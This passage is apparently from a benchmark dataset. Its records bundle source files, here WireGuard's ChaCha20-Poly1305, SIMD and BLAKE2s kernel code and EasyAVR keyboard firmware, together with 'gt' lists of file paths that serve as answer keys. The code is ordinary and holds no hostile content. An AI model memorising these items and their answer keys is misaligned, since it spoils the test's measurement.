simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tpoly1305_update(&poly1305_state, miter.addr,\n\t\t\t\tmin_t(size_t, sl, miter.length), simd_context);\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE))\n\t\tpoly1305_final(&poly1305_state, miter.addr + miter.length + sl,\n\t\t\t       simd_context);\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.mac, src, src_len, sizeof(b.mac), 1);\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\treturn true;\n}\n\nstatic inline bool\n__chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t   const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t   const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t   simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tint ret;\n\tsize_t dst_len;\n\tunion {\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tu8 mac[POLY1305_MAC_SIZE];\n\t\t__le64 lens[2];\n\t} b = { { 0 } };\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE))\n\t\treturn false;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tdst_len = src_len - POLY1305_MAC_SIZE;\n\tpoly1305_update(&poly1305_state, src, dst_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - dst_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(dst_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tpoly1305_final(&poly1305_state, b.mac, simd_context);\n\n\tret = crypto_memneq(b.mac, src + dst_len, POLY1305_MAC_SIZE);\n\tif (likely(!ret))\n\t\tchacha20(&chacha20_state, dst, src, dst_len, simd_context);\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\n\treturn !ret;\n}\n\nbool chacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context, ret;\n\n\tsimd_get(&simd_context);\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len, nonce,\n\t\t\t\t\t key, &simd_context);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\nbool chacha20poly1305_decrypt_sg_inplace(struct scatterlist *src,\n\t\t\t\t\t size_t src_len,\n\t\t\t\t\t const u8 *ad, const size_t ad_len,\n\t\t\t\t\t const u64 nonce,\n\t\t\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE],\n\t\t\t\t\t simd_context_t *simd_context)\n{\n\tstruct poly1305_ctx poly1305_state;\n\tstruct chacha20_ctx chacha20_state;\n\tstruct sg_mapping_iter miter;\n\tsize_t partial = 0;\n\tssize_t sl;\n\tunion {\n\t\tu8 chacha20_stream[CHACHA20_BLOCK_SIZE];\n\t\tu8 block0[POLY1305_KEY_SIZE];\n\t\tstruct {\n\t\t\tu8 read_mac[POLY1305_MAC_SIZE];\n\t\t\tu8 computed_mac[POLY1305_MAC_SIZE];\n\t\t};\n\t\t__le64 lens[2];\n\t} b __aligned(16) = { { 0 } };\n\tbool ret = false;\n\n\tif (unlikely(src_len < POLY1305_MAC_SIZE || WARN_ON(src_len > INT_MAX)))\n\t\treturn ret;\n\tsrc_len -= POLY1305_MAC_SIZE;\n\n\tchacha20_init(&chacha20_state, key, nonce);\n\tchacha20(&chacha20_state, b.block0, b.block0, sizeof(b.block0),\n\t\t simd_context);\n\tpoly1305_init(&poly1305_state, b.block0);\n\n\tpoly1305_update(&poly1305_state, ad, ad_len, simd_context);\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - ad_len) & 0xf,\n\t\t\tsimd_context);\n\n\tsg_miter_start(&miter, src, sg_nents(src), SG_MITER_TO_SG | SG_MITER_ATOMIC);\n\tfor (sl = src_len; sl > 0 && sg_miter_next(&miter); sl -= miter.length) {\n\t\tu8 *addr = miter.addr;\n\t\tsize_t length = min_t(size_t, sl, miter.length);\n\n\t\tpoly1305_update(&poly1305_state, addr, length, simd_context);\n\n\t\tif (unlikely(partial)) {\n\t\t\tsize_t l = min(length, CHACHA20_BLOCK_SIZE - partial);\n\n\t\t\tcrypto_xor(addr, b.chacha20_stream + partial, l);\n\t\t\tpartial = (partial + l) & (CHACHA20_BLOCK_SIZE - 1);\n\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (likely(length >= CHACHA20_BLOCK_SIZE || length == sl)) {\n\t\t\tsize_t l = length;\n\n\t\t\tif (unlikely(length < sl))\n\t\t\t\tl &= ~(CHACHA20_BLOCK_SIZE - 1);\n\t\t\tchacha20(&chacha20_state, addr, addr, l, simd_context);\n\t\t\taddr += l;\n\t\t\tlength -= l;\n\t\t}\n\n\t\tif (unlikely(length > 0)) {\n\t\t\tchacha20(&chacha20_state, b.chacha20_stream, pad0,\n\t\t\t\t CHACHA20_BLOCK_SIZE, simd_context);\n\t\t\tcrypto_xor(addr, b.chacha20_stream, length);\n\t\t\tpartial = length;\n\t\t}\n\n\t\tsimd_relax(simd_context);\n\t}\n\n\tpoly1305_update(&poly1305_state, pad0, (0x10 - src_len) & 0xf,\n\t\t\tsimd_context);\n\n\tb.lens[0] = cpu_to_le64(ad_len);\n\tb.lens[1] = cpu_to_le64(src_len);\n\tpoly1305_update(&poly1305_state, (u8 *)b.lens, sizeof(b.lens),\n\t\t\tsimd_context);\n\n\tif (likely(sl <= -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tret = !crypto_memneq(b.computed_mac,\n\t\t\t\t     miter.addr + miter.length + sl,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\t}\n\n\tsg_miter_stop(&miter);\n\n\tif (unlikely(sl > -POLY1305_MAC_SIZE)) {\n\t\tpoly1305_final(&poly1305_state, b.computed_mac, simd_context);\n\t\tscatterwalk_map_and_copy(b.read_mac, src, src_len,\n\t\t\t\t\t sizeof(b.read_mac), 0);\n\t\tret = !crypto_memneq(b.read_mac, b.computed_mac,\n\t\t\t\t     POLY1305_MAC_SIZE);\n\n\t}\n\n\tmemzero_explicit(&chacha20_state, sizeof(chacha20_state));\n\tmemzero_explicit(&b, sizeof(b));\n\treturn ret;\n}\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\t__chacha20poly1305_encrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t   get_unaligned_le64(nonce + 16),\n\t\t\t\t   (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n}\n\nbool xchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE])\n{\n\tbool ret;\n\tsimd_context_t simd_context;\n\tu32 derived_key[CHACHA20_KEY_WORDS] __aligned(16);\n\n\tsimd_get(&simd_context);\n\thchacha20(derived_key, nonce, key, &simd_context);\n\tcpu_to_le32_array(derived_key, ARRAY_SIZE(derived_key));\n\tret = __chacha20poly1305_decrypt(dst, src, src_len, ad, ad_len,\n\t\t\t\t\t get_unaligned_le64(nonce + 16),\n\t\t\t\t\t (u8 *)derived_key, &simd_context);\n\tmemzero_explicit(derived_key, CHACHA20POLY1305_KEY_SIZE);\n\tsimd_put(&simd_context);\n\treturn ret;\n}\n\n#include \"selftest/chacha20poly1305.c\"\n\n#ifndef COMPAT_ZINC_IS_A_MODULE\nint __init chacha20poly1305_mod_init(void)\n#else\nstatic int __init mod_init(void)\n#endif\n{\n\tif (!selftest_run(\"chacha20poly1305\", chacha20poly1305_selftest,\n\t\t\t  NULL, 0))\n\t\treturn -ENOTRECOVERABLE;\n\treturn 0;\n}\n\n#ifdef COMPAT_ZINC_IS_A_MODULE\nstatic void __exit mod_exit(void)\n{\n}\n\nmodule_init(mod_init);\nmodule_exit(mod_exit);\nMODULE_LICENSE(\"GPL v2\");\nMODULE_DESCRIPTION(\"ChaCha20Poly1305 AEAD construction\");\nMODULE_AUTHOR(\"Jason A. Donenfeld <Jason@zx2c4.com>\");\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'\n:\n\n\n#ifndef _ZINC_CHACHA20POLY1305_H\n#define _ZINC_CHACHA20POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nstruct scatterlist;\n\nenum chacha20poly1305_lengths {\n\tXCHACHA20POLY1305_NONCE_SIZE = 24,\n\tCHACHA20POLY1305_KEY_SIZE = 32,\n\tCHACHA20POLY1305_AUTHTAG_SIZE = 16\n};\n\nvoid chacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t      const u8 *ad, const size_t ad_len,\n\t\t\t      const u64 nonce,\n\t\t\t      const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_encrypt_sg_inplace(\n\tstruct scatterlist *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nbool __must_check\nchacha20poly1305_decrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t const u8 *ad, const size_t ad_len, const u64 nonce,\n\t\t\t const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check chacha20poly1305_decrypt_sg_inplace(\n\tstruct scatterlist *src, size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u64 nonce,\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE], simd_context_t *simd_context);\n\nvoid xchacha20poly1305_encrypt(u8 *dst, const u8 *src, const size_t src_len,\n\t\t\t       const u8 *ad, const size_t ad_len,\n\t\t\t       const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\t\t\t       const u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\nbool __must_check xchacha20poly1305_decrypt(\n\tu8 *dst, const u8 *src, const size_t src_len, const u8 *ad,\n\tconst size_t ad_len, const u8 nonce[XCHACHA20POLY1305_NONCE_SIZE],\n\tconst u8 key[CHACHA20POLY1305_KEY_SIZE]);\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n",
        "gt": [
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/chacha20poly1305.h'",
            "'wireguard-linux-compat/src/crypto/zinc/chacha20poly1305.c'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/mouse.c'",
            "'EasyAVR/firmware/src/keymap.h'",
            "'EasyAVR/firmware/src/config_keymap.h'"
        ],
        "content": "'EasyAVR/firmware/src/mouse.c'\n:\n\n\n#include <stddef.h>\n#include <stdint.h>\n\n#include \"keymap.h\"\n#include \"nvm.h\"\n#include \"mouse.h\"\n\nint8_t g_mouse_report_X;\nint8_t g_mouse_report_Y;\nuint8_t g_mouse_active;\nuint8_t g_mouse_service;\nuint8_t g_cumulative_count;\nuint8_t g_slot;\nuint8_t g_mouse_multiply;\nuint8_t g_jiggle_count;\n\nvoid init_mouse(void)\n{\n\n\tg_slot = 1;\n}\n\n\nvoid update_mouse(void)\n{\n\tuint16_t total_cycle_request;\n\tint8_t mouse_report;\n\n\tif (g_mouse_req_X || g_mouse_req_Y)\n\t{\n\n\t\tg_mouse_active = 1;\n\n\t\tif (!g_mouse_service)\n\t\t{\n\n\t\t\ttotal_cycle_request = (g_mouse_min_delta + (g_mouse_multiply * g_mouse_delta_mult));\n\t\t\tmouse_report = mouse_cycle(total_cycle_request);\n\n\t\t\tg_mouse_report_X = mouse_report * g_mouse_req_X;\n\t\t\tg_mouse_report_Y = mouse_report * g_mouse_req_Y;\n\n\t\t\tg_mouse_service = 1;\n\t\t}\n\t} else {\n\n\t\tif (g_mouse_active)\n\t\t\tg_mouse_service = 1;\n\n\t\tg_mouse_active = 0;\n\t\tg_cumulative_count = 0;\n\t\tg_mouse_report_X = 0;\n\t\tg_mouse_report_Y = 0;\n\n\t\tg_slot = MOUSE_CYCLES;\n\t}\n\n\tif (!g_mouse_active && g_keepawake_flag)\n\t{\n\t\tswitch (g_jiggle_count)\n\t\t{\n\t\tcase 0:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = 0;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = -1;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (!g_mouse_service)\n\t\t\t{\n\t\t\t\tg_mouse_report_X = 1;\n\t\t\t\tg_mouse_service = 1;\n\t\t\t\tg_jiggle_count--;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\n\t\t\tg_jiggle_count--;\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n\nint8_t mouse_cycle(uint16_t total_cycle_request)\n{\n\tuint8_t cumulative_request;\n\tint8_t request;\n\n\n\tcumulative_request = (uint8_t)((total_cycle_request * g_slot) / MOUSE_CYCLES);\n\n\trequest = (int8_t)(cumulative_request - g_cumulative_count);\n\n\tg_cumulative_count += request;\n\n\tif (++g_slot > MOUSE_CYCLES)\n\t{\n\t\tg_cumulative_count = 0;\n\t\tg_slot = 1;\n\t}\n\n\treturn request;\n}\n\n'EasyAVR/firmware/src/keymap.h'\n:\n\n\n#ifndef KEYMAP_H_\n#define KEYMAP_H_\n\n#include <stddef.h>\n#include <stdint.h>\n\n#include \"config_keymap.h\"\n\n\n#define HID_ROLLOVER_SIZE (6)\n\n#if defined (BOARD_SIZE_COSTAR) && defined (__AVR_ATmega32U2__)\n#define KEYMAP_MEMORY_SAVE\n#endif\n\ntypedef struct {\n\tconst uint8_t scancode;\n\tconst uint8_t mask;\n} mod_map_t;\n\ntypedef struct {\n\tconst uint8_t numcode;\n\tconst uint8_t navcode;\n} kp_map_t;\n\ntypedef enum {\n\tSC_CLASS_FN,\n\tSC_CLASS_MOD,\n\tSC_CLASS_MACRO,\n\tSC_CLASS_MOUSE,\n\tSC_CLASS_MEDIA,\n\tSC_CLASS_SPEC,\n\tSC_CLASS_NORM,\n\tSC_CLASS_NULL\n} sc_class_t;\n\nextern uint8_t g_modifier_state;\nextern uint8_t g_report_buffer[HID_ROLLOVER_SIZE+1];\nextern uint8_t g_modifier_service;\nextern uint8_t g_alphanum_service;\nextern uint8_t g_media_service;\nextern uint8_t g_power_service;\nextern uint8_t g_mousebutton_state;\nextern int8_t g_mouse_req_X;\nextern int8_t g_mouse_req_Y;\nextern uint16_t g_media_key;\nextern uint8_t g_powermgmt_field;\nextern uint8_t g_hid_lock_flags;\nextern uint8_t g_keepawake_flag;\nextern uint8_t g_winlock_flag;\n#ifdef MACRO_RAM_SIZE\nextern uint16_t g_ram_macro[MACRO_RAM_SIZE];\nuint8_t g_ram_macro_ptr;\nuint8_t g_ram_macro_length;\n#endif\n\nvoid enqueue_key(const uint8_t code);\nvoid delete_key(const uint8_t code);\nvoid toggle_key(const uint8_t code);\nvoid enqueue_fn(const uint8_t code);\nvoid delete_fn(const uint8_t code);\nvoid set_media(const uint8_t code);\nvoid unset_media(const uint8_t code);\nvoid set_power(const uint8_t code);\nvoid unset_power(void);\nvoid init_keymap(void);\nvoid doubletap_down(const uint8_t row, const uint8_t col, const int16_t idle_time);\nvoid doubletap_up(const uint8_t row, const uint8_t col, const int16_t hold_time, uint8_t * const tap);\nvoid record_stroke(const uint8_t code);\nvoid play_macro(const uint8_t code);\nvoid led_fn_activate(const uint8_t bit);\nvoid led_fn_deactivate(const uint8_t bit);\nvoid fn_down(const uint8_t code, const uint8_t action);\nvoid fn_up(const uint8_t code, const uint8_t action, const uint8_t tapkey, const uint8_t tap);\nvoid mod_down(const uint8_t code, const uint8_t action);\nvoid mod_up(const uint8_t code, const uint8_t action, const uint8_t tapkey, const uint8_t tap);\nvoid alpha_down(const uint8_t code, const uint8_t action);\nvoid alpha_up(const uint8_t code, const uint8_t action, const uint8_t tap);\nvoid handle_code_actuate(const uint8_t code, uint8_t action, const uint8_t wmods);\nvoid handle_code_deactuate(const uint8_t code, uint8_t action, const uint8_t wmods, const uint8_t tap);\nuint8_t translate_code(uint8_t code);\nvoid keymap_actuate(const uint8_t row, const uint8_t col, const int16_t hold_time);\nvoid keymap_deactuate(const uint8_t row, const uint8_t col, const int16_t hold_time);\nvoid keymap_interrupt(const uint8_t row, const uint8_t col);\nvoid get_keyboard_report(uint8_t * const buffer);\nvoid get_nkro_report(uint8_t * const buffer);\nvoid get_modifier_report(uint8_t * const buffer);\nvoid initial_actuate(const uint8_t row, const uint8_t col);\n\n#endif\n'EasyAVR/firmware/src/config_keymap.h'\n:\n\n\n#ifndef CONFIG_KEYMAP_H_\n#define CONFIG_KEYMAP_H_\n\n#include <stddef.h>\n#include <stdint.h>\n#include <avr/pgmspace.h>\n\n#include <LUFA/Drivers/USB/USB.h>\n\n#include \"matrix.h\"\n\n#define FN_BUFFER_SIZE (4)\n\n\n#define LED_LAYERS_SIZE (5)\n\n\n\n#define SC_WIN_CP_PREV_TRACK 0xB6\n#define SC_WIN_CP_STOP 0xB7\n#define SC_WIN_CP_PLAY_PAUSE 0xCD\n#define SC_WIN_CP_BRIGHT_INC 0x6F\n#define SC_WIN_CP_BRIGHT_DEC 0x70\n#define SC_WIN_CP_MUTE 0xE2\n#define SC_WIN_CP_BASS_BOOST 0xE5\n#define SC_WIN_CP_VOL_INC 0xE9\n#define SC_WIN_CP_VOL_DEC 0xEA\n#define SC_WIN_CP_BASS_INC 0x0152\n#define SC_WIN_CP_BASS_DEC 0x0153\n#define SC_WIN_CP_TREB_INC 0x0154\n#define SC_WIN_CP_TREB_DEC 0x0155\n#define SC_WIN_CP_MEDIA_SEL 0x0183\n#define SC_WIN_CP_MAIL 0x018A\n#define SC_WIN_CP_CALC 0x0192\n#define SC_WIN_CP_MY_COMP 0x0194\n#define SC_WIN_CP_SEARCH 0x0221\n#define SC_WIN_CP_HOME 0x0223\n#define SC_WIN_CP_BACK 0x0224\n#define SC_WIN_CP_FORWARD 0x0225\n#define SC_WIN_CP_WWWSTOP 0x0226\n#define SC_WIN_CP_REFRESH 0x0227\n#define SC_WIN_CP_FAVES 0x022A\n\n#define SC_WIN_GDP_POWER 0x81\n#define SC_WIN_GDP_SLEEP 0x82\n#define SC_WIN_GDP_WAKE 0x83\n\n\n\n\n#define SCANCODE_NEXT_TRACK 0x97\n#define SCANCODE_PREV_TRACK 0x98\n#define SCANCODE_STOP 0x99\n#define SCANCODE_PLAY_PAUSE 0x9A\n#define SCANCODE_BRIGHT_INC 0x9B\n#define SCANCODE_BRIGHT_DEC 0x9C\n#define SCANCODE_MUTE 0x9D\n#define SCANCODE_BASS_BOOST 0x9E\n#define SCANCODE_VOL_INC 0x9F\n#define SCANCODE_VOL_DEC 0xA0\n#define SCANCODE_BASS_INC 0xA1\n#define SCANCODE_BASS_DEC 0xA2\n#define SCANCODE_TREB_INC 0xA3\n#define SCANCODE_TREB_DEC 0xA4\n#define SCANCODE_MEDIA_SEL 0xA5\n#define SCANCODE_MAIL 0xA6\n#define SCANCODE_CALC 0xA7\n#define SCANCODE_MYCOMP 0xA8\n#define SCANCODE_SEARCH 0xA9\n#define SCANCODE_BROWSER 0xAA\n#define SCANCODE_BACK 0xAB\n#define SCANCODE_FORWARD 0xAC\n#define SCANCODE_WWWSTOP 0xAD\n#define SCANCODE_REFRESH 0xAE\n#define SCANCODE_FAVES 0xAF\n\n#define NUMBER_OF_MEDIA_KEYS (25)\n\n\n#define SCANCODE_MOUSE1 0xB1\n#define SCANCODE_MOUSE2 0xB2\n#define SCANCODE_MOUSE3 0xB3\n#define SCANCODE_MOUSE4 0xB4\n#define SCANCODE_MOUSE5 0xB5\n#define SCANCODE_MOUSEXR 0xB6\n#define SCANCODE_MOUSEXL 0xB7\n#define SCANCODE_MOUSEYU 0xB8\n#define SCANCODE_MOUSEYD 0xB9\n\n#define NUMBER_OF_MOUSE_BUTTONS (5)\n\n#define SCANCODE_POWER 0xBD\n#define SCANCODE_SLEEP 0xBE\n#define SCANCODE_WAKE 0xBF\n\n#define SCANCODE_BL_DIMMER 0xC1\n#define SCANCODE_BL_MODE 0xC2\n#define SCANCODE_BL_ENABLE 0xC3\n#define SCANCODE_KEEPAWAKE 0xC7\n#define SCANCODE_KEYLOCK 0xC8\n#define SCANCODE_WINLOCK 0xC9\n#define SCANCODE_ESCGRAVE 0xCA\n#define SCANCODE_MRAM_RECORD 0xCC\n#define SCANCODE_MRAM_PLAY 0xCD\n#define SCANCODE_BOOT 0xCE\n#define SCANCODE_CONFIG 0xCF\n\n#define SCANCODE_M1 0xD0\n#define SCANCODE_M2 0xD1\n#define SCANCODE_M3 0xD2\n#define SCANCODE_M4 0xD3\n#define SCANCODE_M5 0xD4\n#define SCANCODE_M6 0xD5\n#define SCANCODE_M7 0xD6\n#define SCANCODE_M8 0xD7\n#define SCANCODE_M9 0xD8\n#define SCANCODE_M10 0xD9\n#define SCANCODE_M11 0xDA\n#define SCANCODE_M12 0xDB\n#define SCANCODE_M13 0xDC\n#define SCANCODE_M14 0xDD\n#define SCANCODE_M15 0xDE\n#define SCANCODE_M16 0xDF\n\n\n#define SCANCODE_FN0 0xF0\n#define SCANCODE_FN1 0xF1\n#define SCANCODE_FN2 0xF2\n#define SCANCODE_FN3 0xF3\n#define SCANCODE_FN4 0xF4\n#define SCANCODE_FN5 0xF5\n#define SCANCODE_FN6 0xF6\n#define SCANCODE_FN7 0xF7\n#define SCANCODE_FN8 0xF8\n#define SCANCODE_FN9 0xF9\n\n#define NUMBER_OF_LAYERS (10)\n\n#if defined(__AVR_ATmega16U2__)\n#define MACRO_BUFFER_SIZE (512)\n#elif defined(__AVR_AT90USB1286__)\n#define MACRO_BUFFER_SIZE (1024 * 4)\n#else\n#define MACRO_BUFFER_SIZE (1024 * 2)\n#endif\n\n#if defined(__AVR_ATmega32U2__)\n#define MACRO_RAM_SIZE (40)\n#elif defined(__AVR_ATmega32U4__)\n#define MACRO_RAM_SIZE (80)\n#elif defined(__AVR_AT90USB1286__)\n#define MACRO_RAM_SIZE (160)\n#endif\n\n#define NUMBER_OF_MACROS (16)\n\n\n#define ACTION_NORMAL (0x00)\n#define ACTION_TOGGLE (0x01)\n#define ACTION_LOCKABLE (0x02)\n#define ACTION_STICKY (0x04)\n#define ACTION_RAPIDFIRE (0x08)\n#define ACTION_TAPKEY (0x80)\n#define TAPKEY_MASK (0x7F)\n\nextern const uint16_t PROGMEM MACRO_BUFFER[MACRO_BUFFER_SIZE];\nextern const uint8_t PROGMEM LAYERS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM ACTIONS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM WMODS[NUMBER_OF_LAYERS][NUMBER_OF_ROWS][NUMBER_OF_COLS];\nextern const uint8_t PROGMEM LED_LAYERS[LED_LAYERS_SIZE];\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/config_keymap.h'",
            "'EasyAVR/firmware/src/keymap.h'",
            "'EasyAVR/firmware/src/mouse.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'",
            "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s-x86_64-glue.c'",
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/compat/neon-arm/include/asm/neon.h'"
        ],
        "content": "'wireguard-linux-compat/src/crypto/zinc/blake2s/blake2s.c'\n:\n\n\n#include <zinc/blake2s.h>\n#include \"../selftest/run.h\"\n\n#include <linux/types.h>\n#include <linux/string.h>\n#include <linux/kernel.h>\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/bug.h>\n#include <asm/unaligned.h>\n\nstatic const u32 blake2s_iv[8] = {\n\t0x6A09E667UL, 0xBB67AE85UL, 0x3C6EF372UL, 0xA54FF53AUL,\n\t0x510E527FUL, 0x9B05688CUL, 0x1F83D9ABUL, 0x5BE0CD19UL\n};\n\nstatic const u8 blake2s_sigma[10][16] = {\n\t{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 },\n\t{ 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3 },\n\t{ 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4 },\n\t{ 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8 },\n\t{ 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13 },\n\t{ 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9 },\n\t{ 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11 },\n\t{ 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10 },\n\t{ 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5 },\n\t{ 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 